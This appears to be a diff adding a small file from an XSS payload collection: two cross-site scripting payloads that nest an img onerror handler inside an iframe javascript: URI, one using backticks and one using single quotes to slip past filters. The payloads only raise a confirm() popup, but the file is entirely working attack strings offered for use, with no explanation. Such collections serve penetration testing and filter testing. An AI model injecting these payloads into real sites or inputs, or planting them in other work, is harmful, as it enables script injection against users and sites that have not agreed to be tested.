@@ -1,0 +1,20 @@
+
+
+	# using backticks :
+
+  XSS PAYLAOD : 
+
+    <iframe src=\"javascript:`<img src=x onerror=confirm('xss')>`\"></iframe>
+
+
+
+  # using single qoute :
+
+  XSS PAYLOAD : 
+
+    <iframe src=\"javascript:'<img src=x onerror=confirm(/xss/)>'\"></iframe>
+
+
+﻿
+
+
